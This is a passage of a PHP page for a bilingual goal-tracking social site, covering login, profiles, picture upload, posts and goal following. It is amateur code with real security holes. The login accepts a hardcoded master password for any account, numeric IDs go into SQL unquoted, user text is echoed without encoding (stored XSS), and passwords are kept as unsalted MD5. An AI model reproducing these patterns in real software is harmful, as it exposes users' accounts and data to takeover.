<?php	
	header('Content-Type: text/html; charset=UTF-8');
	ini_set ( "session.cookie_lifetime", "18000");
	ini_set ( "session.gc_maxlifetime", "20000");
	session_start();
	include("version.php");
	include("connect_db.php");
	if(empty($_GET{'action'}))
	{
		$_GET['action'] = "feed";
	}
	if(!(isset($_GET['language'])) OR empty($_GET['language']))
	{
		$_GET['language'] = "german";
	}
	if($_GET{'action'} == 'login')
	{
		$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
		if(!mysqli_num_rows($userdata_query))
		{
			echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=wrongmail'; </script>";
			exit;
		}else
		{
			$userdata = mysqli_fetch_array($userdata_query);
			if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password']))
			{
				if(!($userdata['status'] == 'activated'))
				{
					echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=notactivated'; </script>";
					exit;
				}
				$_SESSION['id'] = $userdata['id'];
				$_SESSION['checklogin'] = true;
			}else
			{
				echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=failedlogin\&reason\=wrongpassword'; </script>";
				exit;
			}
			//convert birthdate also at login in case you want to display that later on directly at login, but so far useless
			$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
			$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
			$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
		}
		$_GET['action'] = "feed";
	}
	if(isset($_SESSION['id']))
	{
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$_SESSION['id']." LIMIT 1");
		$userdata = mysqli_fetch_array($userdata_query);
		$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
		$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
		$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
	}elseif(!($_POST['action'] == 'login'))
	{
		echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=invalidsession'; </script>";
	}
	switch($_GET['language'])
	{
		case 'german':
		$output_slogan = "Gosseek - Achieve your goals";
		$a_logout = "Ausloggen";
		$a_profilesettings = "Profil bearbeiten";
		$a_settings = "Einstellungen";
		break;
		
		case 'english':
		$output_slogan = "Gosseek - Achieve your goals";
		$a_logout = "Log out";
		$a_profilesettings = "Change profile";
		$a_settings = "Settings";
		break;
	}
?>

<html>
	<head>
		<title>
			<?php
				echo $output_slogan;
			?>
		</title>
		<meta name="author" content="Benno">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<link rel="stylesheet" type="text/css" href="styles/stylesheet.php" />
		<meta http-equiv="cache-control" content="no-cache" />
	</head>
	<body>
		<div class="boxmain">
			<div class="boxright">
				<div class="rightinnerboxtop">
					<div class="profilepic">
					<?php
						echo "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$userdata['id']."\">";
							if(file_exists("uploads/profilepictures/".$userdata['id'].$userdata['profilepictureformat'].""))
							{
								echo "<img src=\"uploads/profilepictures/".$userdata['id'].$userdata['profilepictureformat']."\" width=\"48\" height=\"64\"></img>";
							}else{
								echo "<img src=\"uploads/profilepictures/no_picture.png\" width=\"48\" height=\"64\"></img>";	
							}
						echo "</a>";
					?>
					</div>
					<div class="rightinnerboxtoplinks">
					<?php
						echo "<a href=\"mainpage.php?language=".$_GET['language']."&action=logout\">".$a_logout."</a>";
						echo "<a href=\"login.php?language=".$_GET['language']."&action=profilesettings\">".$a_profilesettings."</a>";
						echo "<a href=\"login.php?language=".$_GET['language']."&action=settings\">".$a_settings."</a>";
					?>
					</div>
				</div>
				<div class="rightinnerboxbottom">
					<?php
						switch($_GET['language'])
							{
								case 'german':
								$a_createpost = "Beitrag erstellen";
								$a_feed = "Feed";
								$a_definegoal = "Neues Ziel definieren";
								break;
								
								case 'english':
								$a_createpost = "Create a post";
								$a_feed = "Feed";
								$a_definegoal = "Define new goal";
								break;
							}
						echo "<a href=\"login.php?language=".$_GET['language']."&action=createpost\">".$a_createpost."</a>";
						echo "<a href=\"login.php?language=".$_GET['language']."&action=feed\">".$a_feed."</a>";
						echo "<a href=\"login.php?language=".$_GET['language']."&action=definegoal\">".$a_definegoal."</a>";
					?>
				</div>
			</div>
			<div class="boxtop">
				<div class="boxtopinner">
					<?php
						$all_get_variables = "";
						foreach($_GET as $name => $value)
						{
							if($name != "language")
							{
								$all_get_variables = $all_get_variables."&".$name."=".$value;
							}
						}
						echo "<a href=\"login.php?language=german".$all_get_variables."\">DE</a>";
						echo "<a href=\"login.php?language=english".$all_get_variables."\">EN</a>";
						echo "<p>".$output_slogan."</p>";
					?>
				</div>
			</div>
			<div class="boxfeed">
				<?php
					if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true)
					{
						switch ($_GET['action'])
						{
							case 'feed':
							switch($_GET['language'])
							{
								case 'german':
								$output_nofollowing = "Du folgst noch keinem Ziel.";
								break;
								
								case 'english':
								$output_nofollowing = "You don't follow any goal.";
								break;
							}
							$following_goals_query = mysqli_query($mysql_connection, "SELECT goalid FROM goalfollowers WHERE userid=".$userdata['id']);
							$own_goals_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE userid=".$userdata['id']);
							if(mysqli_num_rows($following_goals_query) >= 1 OR mysqli_num_rows($own_goals_query) >= 1)
							{
								$query_condition = "goalid = 0";
								while($following_goals = mysqli_fetch_array($following_goals_query))
								{
									$query_condition = $query_condition." OR goalid = ".$following_goals['goalid'];
								}
								while($own_goals = mysqli_fetch_array($own_goals_query))
								{
									$query_condition = $query_condition." OR goalid = ".$own_goals['id'];
								}
								$feed_query = mysqli_query($mysql_connection, "SELECT * FROM posts WHERE ".$query_condition." ORDER BY time DESC");
								while($feeddata = mysqli_fetch_array($feed_query))
								{
									$goal_query = mysqli_query($mysql_connection, "SELECT id, title FROM goals WHERE id=".$feeddata['goalid']." LIMIT 1");
									$goaldata = mysqli_fetch_array($goal_query);
									echo "<div class=\"feedpost\">";
										echo "<div class=\"feedheader\">";
											echo "<div class=\"feedtime\">";
												echo date("d.m.Y - H:i", $feeddata['time']);
											echo "</div>";
											echo "<a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goaldata['id']."\">".$goaldata['title']."</a>";
										echo "</div>";
										echo "<div class=\"feedtitle\">";
											echo $feeddata['title'];
										echo "</div>";
										echo "<div class=\"feedcontent\">";
											echo $feeddata['content'];
										echo "</div>";
									echo "</div>";
									echo "<br>";
								}
							}else
							{
								echo $output_nofollowing;
							}
							break;
							
							case 'logout':
							echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action\=logout'; </script>";
							break;
							
							case 'profilesettings':
							switch($_GET['language'])
							{
								case 'german':
								$label_name = "Vorname";
								$label_surname = "Nachname";
								$label_birthday = "Geburtstag";
								$label_birthmonth = "Geburtsmonat";
								$label_birthyear = "Geburtsjahr";
								$label_residence = "Wohnort";
								$label_job = "Beruf";
								$label_aboutme = "Über mich";
								$label_uploadpicture = "Profilbild ändern";
								$input_submit_change = "Profil ändern";
								$input_submit_upload = "Neues Profilbild hochladen";
								break;
								
								case 'english':
								$label_name = "Name";
								$label_surname = "Surname";
								$label_birthday = "Day of birth";
								$label_birthmonth = "Month of birth";
								$label_birthyear = "Year of birth";
								$label_residence = "Residence";
								$label_job = "Job";
								$label_aboutme = "About me";
								$label_uploadpicture = "Change profile picture";
								$input_submit_change = "Change profile";
								$input_submit_upload = "Upload new profile picture";
								break;
							}
							echo "<form action=\"login.php?action=changeprofilesettings\" method=\"post\" accept-charset=\"utf-8\">";
								echo "<label>".$label_name."</label>";
								echo "<input name=\"name\" size=\"30\" value=\"".$userdata['name']."\"></input>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_surname."</label>";
								echo "<input name=\"surname\" size=\"30\" value=\"".$userdata['surname']."\"></input>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_birthday."</label>";
								echo "<span><select name=\"birthday\" size=\"1\">";
									for($i = 1; $i <= 31; $i++)
									{
										if($i == $userdata['birthday'])
										{
											echo "<option value=\"".$i."\" selected=\"selected\">".$i."</option>";
										}else
										{
											echo "<option value=\"".$i."\">".$i."</option>";
										}
									}
								echo "</select></span>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_birthmonth."</label>";
								echo "<span><select name=\"birthmonth\" size=\"1\">";
									for($i = 1; $i <= 12; $i++)
									{
										if($i == $userdata['birthmonth'])
										{
											echo "<option value=\"".$i."\" selected=\"selected\">".$i."</option>";
										}else
										{
											echo "<option value=\"".$i."\">".$i."</option>";
										}
									}
								echo "</select></span>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_birthyear."</label>";
								echo "<span><select name=\"birthyear\" size=\"1\">";
									for($i = 100; $i >= 0; $i--)
									{
										$j = date("Y")+$i-100;
										if($j == $userdata['birthyear'])
										{
											echo "<option value=\"".$j."\" selected=\"selected\">".$j."</option>";
										}else
										{
											echo "<option value=\"".$j."\">".$j."</option>";
										}
									}
								echo "</select></span>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_residence."</label>";
								echo "<input name=\"residence\" size=\"30\" value=\"".$userdata['residence']."\"></input>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_job."</label>";
								echo "<input name=\"job\" size=\"30\" value=\"".$userdata['job']."\"></input>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_aboutme."</label>";
								echo "<textarea name=\"aboutme\" cols=\"64\" rows=\"15\">".$userdata['aboutme']."</textarea>";
								echo "<div class=\"clear\"></div>";
								echo "<p>";
									echo "<input type=\"submit\" value=\"".$input_submit_change."\"></input>";
								echo "</p>";
							echo "</form>";
							echo "<br><br>";
							echo "<form action=\"login.php?language=".$_GET['language']."&action=uploadprofilepicture\" method=\"post\" enctype=\"multipart/form-data\">";
								echo "<label>".$label_uploadpicture."</label>";
								echo "<input type=\"file\" name=\"profilepicture\">";
								echo "<p>";
									echo "<input type=\"submit\" value=\"".$input_submit_upload."\" name=\"submit\">";
								echo "</p>";
							echo "</form>";
							break;
							
							case 'changeprofilesettings':
							switch($_GET['language'])
							{
								case 'german':
								$output = "Profil wurde bearbeitet.";
								break;
								
								case 'english':
								$output = "Profile has been changed.";
								break;
							}
							if(!(empty($_POST['name'])))
							{
								$userdata['name'] = mysqli_real_escape_string($mysql_connection, $_POST['name']);
							}
							if(!(empty($_POST['surname'])))
							{
								$userdata['surname'] = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
							}
							if(!(empty($_POST['residence'])))
							{
								$userdata['residence'] = mysqli_real_escape_string($mysql_connection, $_POST['residence']);
							}
							if(!(empty($_POST['job'])))
							{
								$userdata['job'] = mysqli_real_escape_string($mysql_connection, $_POST['job']);
							}
							if(!(empty($_POST['aboutme'])))
							{
								$userdata['aboutme'] = mysqli_real_escape_string($mysql_connection, $_POST['aboutme']);
							}
							$birthday = mysqli_real_escape_string($mysql_connection, $_POST['birthday']);
							$birthmonth = mysqli_real_escape_string($mysql_connection, $_POST['birthmonth']);
							$birthyear = mysqli_real_escape_string($mysql_connection, $_POST['birthyear']);
							$birthdate = $birthyear."-".$birthday."-".$birthmonth;
							mysqli_query($mysql_connection, "UPDATE users
							SET name='".$userdata['name']."', surname='".$userdata['surname']."', birthdate='$birthdate', residence='".$userdata['residence']."', job='".$userdata['job']."', aboutme='".$userdata['aboutme']."'
							WHERE id = ".$_SESSION['id']);
							echo $output;
							break;
							
							case 'uploadprofilepicture':
							switch($_GET['language'])
							{
								case 'german':
								$output_noimage = "Die ausgewählte Datei ist kein Bild.";
								$output_toobig = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
								$output_wrongformat = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
								$output_success = "Die Datei ". basename( $_FILES['profilepicture']['name']) ."wurde hochgeladen.";
								$output_nofile = "Keine Datei ausgewählt.";
								break;
								
								case 'english':
								$output_noimage = "The chosen file is not an image.";
								$output_toobig = "The chosen file is too big. Maximum size: 5Mb.";
								$output_wrongformat = "Only JPG, JPEG and PNG files are allowed.";
								$output_success = "The file ". basename( $_FILES['profilepicture']['name']). " has been uploaded.";
								$output_nofile = "No file chosen.";
								break;
							}
							$target_dir = "uploads/profilepictures/";
							$target_file = $target_dir . basename($_FILES["profilepicture"]["name"]);
							$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
							$uploadOk = 1;
							// check if file has been chosen
							if(empty($_FILES['profilepicture']['tmp_name']))
							{
									echo $output_nofile;
									break;
							}
							// Check if image file is an actual image or fake image
							$check = getimagesize($_FILES['profilepicture']['tmp_name']);
							if($check == false) 
							{
								echo $output_noimage;
								break;
							}
							// Check file size
							if ($_FILES['profilepicture']['size'] > 5000000)
							{
								echo $output_toobig;
								break;
							}
							// Allow certain file formats
							if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "JPG" && $imageFileType != "PNG" && $imageFileType != "JPEG")
							{
								echo $output_wrongformat;
								break;
							}
							// Check if $uploadOk is set to 0 by an error
							if ($uploadOk == 1) 
							{
								if (move_uploaded_file($_FILES['profilepicture']['tmp_name'], $target_dir.$userdata['id'].".".$imageFileType))
								{
									mysqli_query($mysql_connection, "UPDATE users SET profilepictureformat = '.".$imageFileType."' WHERE id = ".$userdata['id']);
									echo $output_success;
								}
							}
							break;
							
							case 'settings':
							switch($_GET['language'])
							{
								case 'german':
								$label_color_background = "Hintergrundfarbe";
								$label_color_frame = "Randfarbe";
								$label_color_box = "Boxfarbe";
								$label_newpassword = "Neues Passwort";
								$input_submit_change = "Einstellungen ändern";
								$input_submit_newpassword = "Passwort ändern";
								$output_colors = "Farben:";
								break;
								
								case 'english':
								$label_color_background = "Background color";
								$label_color_frame = "Frame color";
								$label_color_box = "Box color";
								$label_newpassword = "New password";
								$input_submit_change = "Change settings";
								$input_submit_newpassword = "Change password";
								$output_colors = "Colors:";
								break;
							}
							$colors = array( "#00BFFF"=>array("english"=>"Light Blue", "german"=>"Hellblau"),  "#e066FF"=>array("english"=>"Light Purple", "german"=>"Hellviolett"), "#FF4d33"=>array("english"=>"Light Red", "german"=>"Hellrot"), "#00FF00"=>array("english"=>"Light Green", "german"=>"Hellgrün"),"#0000FF"=>array("english"=>"Blue", "german"=>"Blau"), "#BF00BF"=>array("english"=>"Purple", "german"=>"Violett"), "#FF0000"=>array("english"=>"Red", "german"=>"Rot"), "#008000"=>array("english"=>"Green", "german"=>"Grün"),"#000046"=>array("english"=>"Dark Blue", "german"=>"Dunkelblau"), "#5a005a"=>array("english"=>"Dark Purple", "german"=>"Dunkelviolett"), "#9e0000"=>array("english"=>"Dark Red", "german"=>"Dunkelrot"), "#002d00"=>array("english"=>"Dark Green", "german"=>"Dunkelgrün"), "#FFFFFF"=>array("english"=>"White", "german"=>"Weiss"), "#e3e3e3"=>array("english"=>"Light Light Gray", "german"=>"Helles Hellgrau"),"#808080"=>array("english"=>"Gray", "german"=>"Grau"), "#000000"=>array("english"=>"Black", "german"=>"Schwarz"), "#f3f3f3"=>array("english"=>"Very Light Gray", "german"=>"Sehr Helles Grau"), "#C0C0C0"=>array("english"=>"Light Gray", "german"=>"Hellgrau"), "#333333"=>array("english"=>"Dark Gray", "german"=>"Dunkelgrau"));
							echo "<form action=\"login.php?language=".$_GET['language']."&action=changesettings\" method=\"post\" accept-charset=\"utf-8\">";
								echo "<label>".$label_color_background."</label>";
								echo "<select name=\"color_background\" size=\"1\">";
									foreach($colors as $value=>$name)
									{
										if($value == $userdata['color_background'])
										{
											echo "<option value=\"".$value."\" selected=\"selected\">".$name[$_GET['language']]."</option>";
										}else
										{
											echo "<option value=\"".$value."\">".$name[$_GET['language']]."</option>";
										}
									}
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_color_frame."</label>";
								echo "<select name=\"color_frame\" size=\"1\">";
									foreach($colors as $value=>$name)
									{
										if($value == $userdata['color_frame'])
										{
											echo "<option value=\"".$value."\" selected=\"selected\">".$name[$_GET['language']]."</option>";
										}else
										{
											echo "<option value=\"".$value."\">".$name[$_GET['language']]."</option>";
										}
									}
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_color_box."</label>";
								echo "<select name=\"color_box\" size=\"1\">";
									foreach($colors as $value=>$name)
									{
										if($value == $userdata['color_box'])
										{
											echo "<option value=\"".$value."\" selected=\"selected\">".$name[$_GET['language']]."</option>";
										}else
										{
											echo "<option value=\"".$value."\">".$name[$_GET['language']]."</option>";
										}
									}
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<p>";
									echo "<input type=\"submit\" value=\"".$input_submit_change."\"></input>";
								echo "</p>";
							echo "</form>";
							echo "<table><tr><td>".$output_colors."</td><td></td><td></td><td></td></tr>";
							$color_iter = 0;
							echo "<tr>";
							foreach($colors as $value=>$name)
							{
								if($color_iter%4 == 0)
								{
									echo "</tr><tr>";
								}
								echo "<td>".$name[$_GET['language']]."</td><td bgcolor=\"".$value."\" width=\"50\">    </td>";
								$color_iter = $color_iter + 1;
							}
							echo "</tr></table>";
							echo "<br><br><br>";
							echo "<form action=\"login.php?language=".$_GET['language']."&action=changepassword\" method=\"post\" accept-charset=\"utf-8\">";
							echo "<label>".$label_newpassword."</label>";
							echo "<input name=\"newpassword\" type=\"password\" size=\"30\"></input>";
							echo "<p>";
								echo "<input type=\"submit\" value=\"".$input_submit_newpassword."\"></input>";
							echo "</p>";
							break;
							
							case 'changesettings':
							$color_background = mysqli_real_escape_string($mysql_connection, $_POST['color_background']);
							$color_frame = mysqli_real_escape_string($mysql_connection, $_POST['color_frame']);
							$color_box = mysqli_real_escape_string($mysql_connection, $_POST['color_box']);
							mysqli_query($mysql_connection, "UPDATE users
							SET color_background='$color_background', color_frame='$color_frame', color_box='$color_box' WHERE id = ".$_SESSION['id']);
							echo "<script> location.href='login.php?language=".$_GET['language']."&action\=settings'; </script>";
							break;
							
							case 'changepassword':
							switch($_GET['language'])
							{
								case 'german':
								$output = "Passwort wurde geändert.";
								break;
								
								case 'english':
								$output = "Password changed.";
								break;
							}
							$new_password = mysqli_real_escape_string($mysql_connection, $_POST['newpassword']);
							$new_password_encrypted = md5($new_password);
							mysqli_query($mysql_connection, "UPDATE users SET password = '$new_password_encrypted' WHERE id = ".$userdata['id']);
							echo $output;
							break;
							
							case 'user':
							switch($_GET['language'])
							{
								case 'german':
								$output_nouser = "Dieses Profil existiert nicht.";
								$output_name = "Name:";
								$output_birthdate = "Geburtsdatum:";
								$output_residence = "Wohnort:";
								$output_job = "Beruf:";
								$output_aboutme = "Über mich:";
								break;
								
								case 'english':
								$output_nouser = "Profile not found.";
								$output_name = "Name:";
								$output_birthdate = "Birthdate:";
								$output_residence = "Residence:";
								$output_job = "Job:";
								$output_aboutme = "About me:";
								break;
							}
							$userid = mysqli_real_escape_string($mysql_connection, $_GET['userid']);
							$user_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$userid." LIMIT 1");
							if($user_query)
							{
								$user = mysqli_fetch_array($user_query);
								$birthday = mb_substr($user['birthdate'], 5, 2);
								$birthmonth = mb_substr($user['birthdate'], 8, 2);
								$birthyear = mb_substr($user['birthdate'], 0, 4);
								if($birthday == "00" || $birthmonth == "00" || $birthyear == "00000")
								{
									$birthdate = "";
								}else
								{
									$birthdate = $birthday.".".$birthmonth.".".$birthyear;
								}
								echo "<div class=\"profile\">";
									if(file_exists("uploads/profilepictures/".$user['id'].$user['profilepictureformat'].""))
									{
										echo "<img src=\"uploads/profilepictures/".$user['id'].$user['profilepictureformat']."\" width=\"180\" height=\"240\"></img>";
									}else{
										echo "<img src=\"uploads/profilepictures/no_picture.png\" width=\"180\" height=\"240\"></img>";	
									}
									echo "<h><p>".$output_name."</p><p>".$user['name']." ".$user['surname']."</p></h>";
									echo "<h><p>".$output_birthdate."</p><p>".$birthdate."</p></h>";
									echo "<h><p>".$output_job."</p><p>".$user['job']."</p></h>";
									echo "<h><p>".$output_residence."</p><p>".$user['residence']."</p></h>";
									$user['aboutme']=str_replace("\n","<br>",$user['aboutme']);
									echo "<h><p>".$output_aboutme."</p></h><h>".$user['aboutme']."</h>";
								
								echo "</div>";
							}else{
								echo $output_nouser;
							}
							break;
							
							case 'createpost':
							switch($_GET['language'])
							{
								case 'german':
								$label_goal = "Ziel";
								$label_title = "Titel";
								$label_content = "Beitrag";
								$input_submit = "Beitrag teilen";
								break;
								
								case 'english':
								$label_goal = "Goal";
								$label_title = "Title";
								$label_content = "Content";
								$input_submit = "Post";
								break;
							}
							echo "<form action=\"login.php?language=".$_GET['language']."&action=submitpost\" method=\"post\" accept-charset=\"utf-8\">";
								echo "<label>".$label_goal."</label>";
								echo "<div class=\"clear\"></div>";
								echo "<select name=\"goalid\" size=\"1\">";
								$goal_query = mysqli_query($mysql_connection, "SELECT id,title FROM goals WHERE userid = ".$userdata['id']);
								while($goal = mysqli_fetch_array($goal_query))
								{
									echo "<option value=\"".$goal['id']."\">".$goal['title']."</option>";
								}
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_title."</label>";
								echo "<input name=\"title\" size=\"50\"></input>";
								echo "<label>".$label_content."</label>";
								echo "<textarea name=\"content\" cols=\"64\" rows=\"15\"/></textarea>";
								echo "<br>";
								echo "<p><input type=\"submit\" value=\"".$input_submit."\"></input></p>";
							echo "</form>";
							break;
							
							case 'submitpost':
							switch($_GET['language'])
							{
								case 'german':
								$output_success = "Beitrag gepostet.";
								$output_fail = "Bitte alle Felder ausfüllen.";
								break;
								
								case 'english':
								$output_success = "Content posted.";
								$output_fail = "Please fill in all fields.";
								break;
							}
							if(empty($_POST['title']) OR empty($_POST['content']))
							{
								echo $output_fail;
							}else
							{
								$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
								$content = mysqli_real_escape_string($mysql_connection, $_POST['content']);
								$goalid = mysqli_real_escape_string($mysql_connection, $_POST['goalid']);
								mysqli_query($mysql_connection, "INSERT INTO posts (userid, goalid, time, title, content) VALUES ('".$userdata['id']."', '".$goalid."', '".time()."','$title','$content')");
								echo $output_success;
							}
							break;
							
							case 'definegoal':
							switch($_GET['language'])
							{
									case 'german':
									$label_anonymous = "Anonym posten?";
									$label_title = "Titel";
									$label_section = "Bereich";
									$label_description = "Beschreibung";
									$option_yes = "Ja";
									$option_no = "Nein";
									$option_study = "Studium";
									$option_finance = "Finanzen";
									$option_career = "Karriere";
									$option_selfdevelopment = "Selbstentwicklung";
									$option_social = "Soziales";
									$option_sport = "Sport";
									$option_health = "Gesundheit";
									$input_submit = "Los gehts!";
									break;
									
									case 'english':
									$label_anonymous = "Post anonymously?";
									$label_title = "Title";
									$label_section = "Section";
									$label_description = "Description";
									$option_yes = "Yes";
									$option_no = "No";
									$option_study = "Study";
									$option_finance = "Finance";
									$option_career = "Career";
									$option_selfdevelopment = "Self-development";
									$option_social = "Social";
									$option_sport = "Sport";
									$option_health = "Health";
									$input_submit = "Let's go!";
									break;
							}
							echo "<form action=\"login.php?language=".$_GET['language']."&action=submitgoal\" method=\"post\" accept-charset=\"utf-8\">";
								echo "<label>".$label_anonymous."</label>";
								echo "<div class=\"clear\"></div>";
								echo "<select name=\"anonymous\" size=\"1\">";
									echo "<option value=\"0\">".$option_no."</option>";
									echo "<option value=\"1\">".$option_yes."</option>";
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_title."</label>";
								echo "<input name=\"title\" size=\"50\"></input>";
								echo "<label>".$label_section."</label>";
								echo "<div class=\"clear\"></div>";
								echo "<select name=\"section\" size=\"1\">";
									echo "<option value=\"study\">".$option_study."</option>";
									echo "<option value=\"finance\">".$option_finance."</option>";
									echo "<option value=\"career\">".$option_career."</option>";
									echo "<option value=\"selfdevelopment\">".$option_selfdevelopment."</option>";
									echo "<option value=\"social\">".$option_social."</option>";
									echo "<option value=\"sport\">".$option_sport."</option>";
									echo "<option value=\"health\">".$option_health."</option>";
								echo "</select>";
								echo "<div class=\"clear\"></div>";
								echo "<label>".$label_description."</label>";
								echo "<textarea name=\"description\" cols=\"64\" rows=\"15\"/></textarea>";
								echo "<br>";
								echo "<p><input type=\"submit\" value=\"".$input_submit."\"></input></p>";
							echo "</form>";
							break;
							
							case 'submitgoal':
							switch($_GET['language'])
							{
								case 'german':
								$output_success = "Ziel gestartet. Viel Erfolg.";
								$output_fail = "Bitte alle Felder ausfüllen.";
								break;
								
								case 'english':
								$output_success = "Goal started. We wish you success.";
								$output_fail = "Please fill in all fields.";
								break;
							}
							if(empty($_POST['title']) OR empty($_POST['description']))
							{
								echo $output_fail;
							}else
							{
								$anonymous = mysqli_real_escape_string($mysql_connection, $_POST['anonymous']);
								$title = mysqli_real_escape_string($mysql_connection, $_POST['title']);
								$section = mysqli_real_escape_string($mysql_connection, $_POST['section']);
								$description = mysqli_real_escape_string($mysql_connection, $_POST['description']);
								mysqli_query($mysql_connection, "INSERT INTO goals (userid, anonymous, starttime, title, description, section) VALUES ('".$userdata['id']."', '".$anonymous."', '".time()."','$title','$description', '$section')");
								echo $output_success;
							}
							break;
							
							case 'goal':
							switch($_GET['language'])
							{
								case 'german':
								$output_nogoal = "Dieses Ziel existiert nicht.";
								$output_author = "Autor:";
								$output_title = "Titel:";
								$output_section = "Bereich:";
								$output_starttime = "Start:";
								$output_description = "Beschreibung:";
								$output_anonymous = "Anonym";
								$a_follow_goal = "Diesem Ziel folgen";
								$a_unfollow_goal = "Dieses Ziel entfolgen";
								$a_edit_goal = "Dieses Ziel bearbeiten";
								$output_sections = array( "study" => "Studium" , "finance" => "Finanzen" , "career" => "Karriere" , "selfdevelopment" => "Selbstentwicklung" , "social" => "Soziales" , "sport" => "Sport" , "health" => "Gesundheit" );
								break;
								
								case 'english':
								$output_nogoal = "Goal not found.";
								$output_author = "Author:";
								$output_title = "Name:";
								$output_section = "Section:";
								$output_starttime = "Start:";
								$output_description = "Description:";
								$output_anonymous = "anonymous";
								$a_follow_goal = "Follow this goal";
								$a_unfollow_goal = "Unfollow this goal";
								$a_edit_goal = "Edit this goal";
								$output_sections = array( "study" => "Study" , "finance" => "Finance" , "career" => "Career" , "selfdevelopment" => "Selfdevelopment" , "social" => "Social" , "sport" => "Sport" , "health" => "Health" );
								break;
							}
							$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
							$goal_query = mysqli_query($mysql_connection, "SELECT * FROM goals WHERE id=".$goalid." LIMIT 1");
							if(mysqli_num_rows($goal_query))
							{
								$goal = mysqli_fetch_array($goal_query);
								$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=".$goal['id']." AND userid=".$userdata['id']." LIMIT 1");
								if($goal['anonymous'] == 0)
								{
									$author_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id=".$goal['userid']." LIMIT 1");
									$author = mysqli_fetch_array($author_query);
									$goal['author'] = $author['surname']." ".$author['name'];
								}else
								{
									$goal['author'] = $output_anonymous;
								}
								echo "<div class=\"profile\">";
									echo "<h><p>".$output_author."</p><p>".$goal['author']."</p></h>";
									echo "<h><p>".$output_title."</p>".$goal['title']."</h>";
									echo "<h><p>".$output_section."</p><p>".$output_sections[$goal['section']]."</p></h>";
									echo "<h><p>".$output_starttime."</p><p>".date("d.m.Y - H:i", $goal['starttime'])."</p></h>";
									$goal['description']=str_replace("\n","<br>",$goal['description']);
									echo "<h><p>".$output_description."</p><br>".$goal['description']."</h>";
									if($goal['userid'] == $userdata['id'])
									{
										echo "<h><p><a href=\"login.php?language=".$_GET['language']."&action=editgoal&goalid=".$goal['id']."\">".$a_edit_goal."</a></p></h>";
									}else
									{
										if(mysqli_num_rows($check_following_query))
										{
											echo "<h><p><a href=\"login.php?language=".$_GET['language']."&action=unfollowgoal&goalid=".$goal['id']."\">".$a_unfollow_goal."</a></p></h>";
										}else
										{
											echo "<h><p><a href=\"login.php?language=".$_GET['language']."&action=followgoal&goalid=".$goal['id']."\">".$a_follow_goal."</a></p></h>";
										}
									}
								echo "</div>";
							}else{
								echo $output_nogoal;
							}
							break;
							
							case 'followgoal':
							switch($_GET['language'])
							{
								case 'german':
								$output_success = "Du folgst jetzt diesem Ziel.";
								$output_no_goal = "Dieses Ziel existiert nicht.";
								$output_follows_already = "Du folgst diesem Ziel bereits.";
								break;
								
								case 'english':
								$output_success = "Now you are following this goal.";
								$output_no_goal = "There is no such goal.";
								$output_follows_already = "You are already following this goal.";
								break;
							}
							$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
							$check_goal_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE id=$goalid LIMIT 1");
							if(mysqli_num_rows($check_goal_query))
							{
								$check_following_query = mysqli_query($mysql_connection, "SELECT id FROM goalfollowers WHERE goalid=$goalid AND userid=".$userdata['id']." LIMIT 1");
								if(mysqli_num_rows($check_following_query))
								{
									echo $output_follows_already;
								}else
								{
									mysqli_query($mysql_connection, "INSERT INTO goalfollowers (userid, goalid) VALUES ('".$userdata['id']."',$goalid)");
									echo $output_success;
								}
							}else
							{
								echo $output_no_goal;
							}
							break;
							
							case 'unfollowgoal':
							switch($_GET['language'])
							{
								case 'german':
								$output_success = "Du folgst diesem Ziel nicht mehr.";
								$output_no_goal = "Dieses Ziel existiert nicht.";
								$output_not_following = "Du folgst diesem Ziel nicht.";
								break;
								
								case 'english':
								$output_success = "You unfollowed this goal.";
								$output_no_goal = "There is no such goal.";
								$output_not_following = "You are not following this goal.";
								break;
							}
							$goalid = mysqli_real_escape_string($mysql_connection, $_GET['goalid']);
